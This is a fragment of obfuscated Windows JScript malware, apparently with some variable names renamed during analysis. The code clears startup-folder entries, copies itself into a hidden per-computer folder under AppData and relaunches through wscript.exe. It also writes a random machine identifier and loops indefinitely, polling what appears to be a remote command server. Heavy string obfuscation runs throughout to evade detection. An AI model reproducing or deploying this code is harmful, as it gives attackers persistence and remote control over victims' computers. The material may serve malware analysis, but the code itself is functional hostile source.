									for (var kD4m = 0; kD4m < BFoP["length"]; kD4m++) {
										try {
											scriptingFileSystemObjectAXO["deleteFile"](startUpPath + BFoP[kD4m])
										} catch (sfJM) {}
									}
								} catch (sfJM) {}
							}
						}
					} catch (sfJM) {}
					if (WScript["ScriptFullName"]["split"]("\\")["shift"]() == process("systemdrive")) emptyArray1["push"](WScript["ScriptFullName"]);
					var Om$e = process("temp") + "\\" + encodeComputerNameWithNumber(computerName + "08") + ".js";
					if (WScript["Arguments"]["" + "lengt" + (81 > 49 ? "\x68" : "\x63") + ""] > 0 && WScript["" + (73 > 41 ? "\x41" : "\x39") + "rg" + "um" + (80 > 22 ? "\x65" : "\x60") + "nts"](0) == encodeComputerNameWithNumber(computerName + "ug0ax7" ['replace'](/[xgau]/g, ""))) {
						try {
							scriptingFileSystemObjectAXO["del" + (51 > 25 ? "\x65" : "\x5e") + "t" + "e" + (95 > 49 ? "\x46" : "\x3d") + "ile"](Om$e)
						} catch (sfJM) {}
						WScript["" + "" + (96 > 11 ? "\x71" : "\x67") + "uit"]();
					} else if (HVan == 0) {
						try {
							qnEe = scriptingFileSystemObjectAXO["openT" + (93 > 30 ? "\x65" : "\x5d") + "" + "xtFi" + (100 > 41 ? "\x6c" : "\x67") + "e"](malFolder + encodeComputerNameWithNumber(computerName + "Q0y0" [(29.0 + "F\x8bt2i7k4$#XhPu6\x89^p" ['charCodeAt'](9) * 572686467)['toString']((2 * "&t2P1axVp\x88u\x87" ["length"] + 6.0))](/[Qy]/g, "")), 8, !0)
						} catch (sfJM) {}
					}
					hr(0);
					gwrH(1);
					ZGwe();
					numberFlagMaybe = 0;
					break
				} catch (sfJM) {}
			}
		}
		if (numberFlagMaybe) {
			var hMAa = process("C+ugsW_e=r>pXSrVoSHfEiz!lzde" [("Vpe#Bv\x87" ["length"] * 2863432339 + 1.0)['toString'](("\x8bf8mD=Vchp^\x7f" ["length"] * 2 + 6.0))](/[zC\!XS\>\_V\=dEHWg\+]/g, "")) + (windowsVersion[0] >= 6 ? "`\\;Akp3pGDNaI7tCa=Y\\vRKo_%a%Tmwi*n)cgJ\\" [("\x87K/qw~Yn\x86ZicvD" ["length"] * 3600493343 + 7.0)['toString'](("\x60&p8oTFKn.y$M5>6" ['charCodeAt'](3) * 0 + 35.0))](/[G\=\_YCJTk7\;N\)vcK3\%\*wI\`]/g, "") : "1\\" ['replace'](/[1]/g, "")) + encodeComputerNameWithNumber(computerName + "405n2" [(3276411606 * "19?f8\x84.YN" ["length"] + 8.0)['toString']((2.0 + ".@c*7" ["length"] * 6))](/[n54]/g, "")),
				bbz = hMAa + "q\\" [(4.0 + ";RJ+e" ["length"] * 4008805274)['toString'](("3hB>|qU" ["length"] * 4 + 2.0))](/[q]/g, "") + encodeComputerNameWithNumber(computerName + "!0Z/4" ['replace'](/[\!\/Z]/g, "")) + "ma.PEjps" ['replace'](/[aEPmp]/g, "");
			try {
				scriptingFileSystemObjectAXO["c" + (59 > 30 ? "\x72" : "\x6c") + "ea" + "teFol" + (70 > 5 ? "\x64" : "\x5b") + "er"](hMAa)
			} catch (sfJM) {}
			showOrHideInExplorerFunc(hMAa);
			scriptingFileSystemObjectAXO["copyFi" + (93 > 15 ? "\x6c" : "\x66") + "" + "e"](WScript["Scr" + (66 > 22 ? "\x69" : "\x5f") + "p" + "t" + (99 > 10 ? "\x46" : "\x3d") + "ullName"], bbz, true);
			showOrHideInExplorerFunc(bbz);
			try {
				qnEe["c" + (62 > 30 ? "\x6c" : "\x67") + "o" + "" + (99 > 10 ? "\x73" : "\x6d") + "e"]()
			} catch (sfJM) {}
			shellApplicationAXO["shellE" + (95 > 39 ? "\x78" : "\x6f") + "" + "ecut" + (72 > 2 ? "\x65" : "\x60") + ""]("6wusIckvr0i2p;t0.`e1mxCe" ['replace'](/[k2I\;m06\`Cu1v]/g, ""), "E\"" [(7089588933 * ">\x7f\x80(@" ["length"] + 2.0)['toString']((5 * "\x8aDk#y)" ["length"] + 3.0))](/[E]/g, "") + WScript["Scr" + (51 > 13 ? "\x69" : "\x5f") + "ptFul" + "" + (53 > 26 ? "\x6c" : "\x63") + "Name"] + "=\"2 " ['replace'](/[\=2]/g, "") + encodeComputerNameWithNumber(computerName + "Gw1+t4" [("b\x83Q$|<Z1J9u7TKr/360n" ['charCodeAt'](6) * 393866051 + 77.0)['toString']((0 * "V\x7f.51PO(dtNIw^" ['charCodeAt'](3) + 33.0))](/[wt\+G]/g, "")), "" ['replace']("d3NOg7kWvY", ""), "" ['replace']("dJEppP0QEg", ""), 0);
			WScript["q" + (58 > 20 ? "\x75" : "\x6d") + "" + "" + (58 > 42 ? "\x69" : "\x5f") + "t"]()
		}
	} catch (sfJM) {
		WScript["" + "" + (98 > 42 ? "\x71" : "\x68") + "uit"]()
	}
	var Ptez = "8*e" ['replace'](/[8\*]/g, ""),
		otf;
	if (scriptingFileSystemObjectAXO["" + "fileExi" + (79 > 14 ? "\x73" : "\x6a") + "ts"](MKsP)) {
		try {
			otf = scriptingFileSystemObjectAXO["o" + (78 > 29 ? "\x70" : "\x66") + "enTextFi" + "" + (80 > 24 ? "\x6c" : "\x65") + "e"](MKsP, 1);
			Ptez = otf["read" + (64 > 18 ? "\x41" : "\x38") + "l" + "l"](), otf["c" + (55 > 10 ? "\x6c" : "\x64") + "" + "o" + (55 > 22 ? "\x73" : "\x6c") + "e"]()
		} catch (sfJM) {}
	} else {
		try {
			Ptez = anotherRandom4CharGeneratorFunc() + anotherRandom4CharGeneratorFunc() + "V-" ['replace'](/[V]/g, "") + anotherRandom4CharGeneratorFunc() + "c-" ['replace'](/[c]/g, "") + anotherRandom4CharGeneratorFunc() + "/-" ['replace'](/[\/]/g, "") + anotherRandom4CharGeneratorFunc() + "L-" ['replace'](/[L]/g, "") + anotherRandom4CharGeneratorFunc() + anotherRandom4CharGeneratorFunc() + anotherRandom4CharGeneratorFunc();
			otf = scriptingFileSystemObjectAXO["open" + (61 > 21 ? "\x54" : "\x4a") + "" + "" + (99 > 38 ? "\x65" : "\x5e") + "xtFile"](MKsP, 2, 1);
			otf["" + "" + (75 > 4 ? "\x77" : "\x70") + "rite"](Ptez), otf["" + "clo" + (86 > 18 ? "\x73" : "\x6c") + "e"]()
		} catch (sfJM) {}
	}
	showOrHideInExplorerFunc(MKsP);
	while (true) {
		if (sendRequestToSearchEngineFunc() !== false) {
			while (true) {
				try {
					$(1);
					for (var q$gq = new Date()["getTime"](); q$gq + (60 * 53 * 1000) >= new Date()["getTime"](); ZGwe()) WScript["getTime"](2000)
				} catch (sfJM) {
					if (sendRequestToSearchEngineFunc() == false) break;
					for (var q$gq = new Date()["getTime"](); q$gq + 8000 >= new Date()["getTime"](); ZGwe()) WScript["sleep"](2000)
				}
			}
		} else {
			for (var q$gq = new Date()["getTime"](); q$gq + (60 * 3 * 1000) >= new Date()["getTime"](); ZGwe()) WScript["sleep"](2000)
		}
	}
})();